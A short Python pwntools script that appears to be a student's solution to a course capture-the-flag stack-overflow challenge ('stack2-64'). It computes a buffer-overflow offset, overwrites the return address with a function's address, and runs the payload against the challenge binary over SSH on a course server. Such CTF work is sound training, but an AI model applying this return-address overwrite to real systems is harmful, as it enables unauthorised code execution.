# stack0ex.py - Aidan Wech (Onyxymous)
from pwn import *

# debug info
elf = ELF('./stack2-64')
context.binary = elf
context.log_level = 'debug'

p = process('./stack2-64')
offset = cyclic_find(pack(p.corefile.rdx))
recaladdr = p.corefile.exe.start + ELF('./stack2-64').symbols.recalibration
exploit_str = flat({offset: pack(recaladdr)})

s = ssh('ahwech', 'cs4401shell.walls.ninja', keyfile='../../onyx_ssh_key')
s.set_working_directory('/problems/stack2r-64_3_c775770831eff590c71649b9f3979376/')
p = s.process('./stack2-64')

p.sendline(exploit_str)
p.recvall()
p.wait()
